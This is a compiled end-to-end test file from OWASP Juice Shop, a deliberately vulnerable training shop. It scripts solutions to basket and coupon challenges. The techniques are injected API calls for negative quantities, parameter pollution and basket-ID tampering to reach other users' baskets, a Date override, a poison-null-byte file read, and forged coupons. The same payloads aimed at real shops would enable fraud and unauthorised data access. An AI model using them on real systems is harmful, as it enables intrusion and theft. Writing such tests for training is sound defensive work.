"use strict";
/*
 * Copyright (c) 2014-2021 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */
Object.defineProperty(exports, "__esModule", { value: true });
const config = require("config");
const protractor_1 = require("protractor");
const security = require('../../lib/insecurity');
const models = require('../../models/index');
describe('/#/basket', () => {
    describe('as admin', () => {
        protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' });
        describe('challenge "negativeOrder"', () => {
            it('should be possible to update a basket to a negative quantity via the Rest API', () => {
                void protractor_1.browser.waitForAngularEnabled(false);
                protractor_1.browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("PUT","${protractor_1.browser.baseUrl}/api/BasketItems/1", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",\`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"quantity": -100000}));`); // eslint-disable-line
                void protractor_1.browser.driver.sleep(1000);
                void protractor_1.browser.waitForAngularEnabled(true);
                void protractor_1.browser.get(`${protractor.basePath}/#/order-summary`);
                const productQuantities = (0, protractor_1.$$)('mat-cell.mat-column-quantity > span');
                expect(productQuantities.first().getText()).toMatch(/-100000/);
            });
            it('should be possible to place an order with a negative total amount', () => {
                void (0, protractor_1.element)(protractor_1.by.id('checkoutButton')).click();
            });
            protractor.expect.challengeSolved({ challenge: 'Payback Time' });
        });
        describe('challenge "basketAccessChallenge"', () => {
            it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
                void protractor_1.browser.executeScript('window.sessionStorage.bid = 3;');
                void protractor_1.browser.get(`${protractor.basePath}/#/basket`);
                // TODO Verify functionally that it's not the basket of the admin
            });
            protractor.expect.challengeSolved({ challenge: 'View Basket' });
        });
        describe('challenge "basketManipulateChallenge"', () => {
            it('should manipulate basket of other user instead of the one associated to logged-in user', () => {
                void protractor_1.browser.waitForAngularEnabled(false);
                void protractor_1.browser.executeScript(baseUrl => {
                    const xhttp = new XMLHttpRequest();
                    xhttp.onreadystatechange = function () {
                        if (this.status === 200) {
                            console.log('Success');
                        }
                    };
                    xhttp.open('POST', `${baseUrl}/api/BasketItems/`);
                    xhttp.setRequestHeader('Content-type', 'application/json');
                    xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`);
                    xhttp.send('{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }'); //eslint-disable-line
                }, protractor_1.browser.baseUrl);
                void protractor_1.browser.driver.sleep(1000);
                void protractor_1.browser.waitForAngularEnabled(true);
            });
            protractor.expect.challengeSolved({ challenge: 'Manipulate Basket' });
        });
    });
    describe('as jim', () => {
        protractor.beforeEach.login({ email: `jim@${config.get('application.domain')}`, password: 'ncc-1701' });
        describe('challenge "manipulateClock"', () => {
            it('should be possible to enter WMNSDY2019 coupon', () => {
                void protractor_1.browser.waitForAngularEnabled(false);
                void protractor_1.browser.executeScript('window.localStorage.couponPanelExpanded = false;');
                void protractor_1.browser.driver.sleep(2000);
                void protractor_1.browser.waitForAngularEnabled(true);
                void protractor_1.browser.get(`${protractor.basePath}/#/payment/shop`);
                void protractor_1.browser.waitForAngularEnabled(false);
                void protractor_1.browser.executeScript('event = new Date("March 08, 2019 00:00:00"); Date = function(Date){return function() {date = event; return date; }}(Date);');
                void protractor_1.browser.driver.sleep(2000);
                void protractor_1.browser.waitForAngularEnabled(true);
                void (0, protractor_1.element)(protractor_1.by.id('collapseCouponElement')).click();
                void protractor_1.browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.'); // eslint-disable-line no-undef
                void (0, protractor_1.element)(protractor_1.by.id('coupon')).sendKeys('WMNSDY2019');
                void (0, protractor_1.element)(protractor_1.by.id('applyCouponButton')).click();
            });
            it('should be possible to place an order with the expired coupon', () => {
                void protractor_1.browser.get(`${protractor.basePath}/#/order-summary`);
                void (0, protractor_1.element)(protractor_1.by.id('checkoutButton')).click();
            });
            protractor.expect.challengeSolved({ challenge: 'Expired Coupon' });
        });
        describe('challenge "forgedCoupon"', () => {
            it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', () => {
                void protractor_1.browser.driver.get(`${protractor_1.browser.baseUrl}/ftp/coupons_2013.md.bak%2500.md`);
            });
            it('should be possible to add a product in the basket', () => {
                void protractor_1.browser.waitForAngularEnabled(false);
                models.sequelize.query('SELECT * FROM PRODUCTS').then(([products]) => {
                    void protractor_1.browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () { if (this.status === 201) { console.log("Success") } } ; xhttp.open("POST", "${protractor_1.browser.baseUrl}/api/BasketItems/", true); xhttp.setRequestHeader("Content-type", "application/json"); xhttp.setRequestHeader("Authorization", \`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"BasketId": \`$\{sessionStorage.getItem("bid")}\`, "ProductId":1, "quantity": 1}))`); // eslint-disable-line
                });
                void protractor_1.browser.driver.sleep(1000);
                void protractor_1.browser.waitForAngularEnabled(true);
            });
            it('should be possible to enter a coupon that gives an 80% discount', () => {
                void protractor_1.browser.executeScript('window.localStorage.couponPanelExpanded = false;');
                void protractor_1.browser.get(`${protractor.basePath}/#/payment/shop`);
                void protractor_1.browser.driver.sleep(1000);
                void (0, protractor_1.element)(protractor_1.by.id('collapseCouponElement')).click();
                void protractor_1.browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.'); // eslint-disable-line no-undef
                void protractor_1.browser.driver.sleep(1000);
                void (0, protractor_1.element)(protractor_1.by.id('coupon')).sendKeys(security.generateCoupon(90));
                void protractor_1.browser.driver.sleep(1000);
                void (0, protractor_1.element)(protractor_1.by.id('applyCouponButton')).click();
            });
            it('should be possible to place an order with a forged coupon', () => {
                void protractor_1.browser.get(`${protractor.basePath}/#/order-summary`);
                void (0, protractor_1.element)(protractor_1.by.id('checkoutButton')).click();
            });
            protractor.expect.challengeSolved({ challenge: 'Forged Coupon' });
        });
    });
});
//# sourceMappingURL=basketSpec.js.map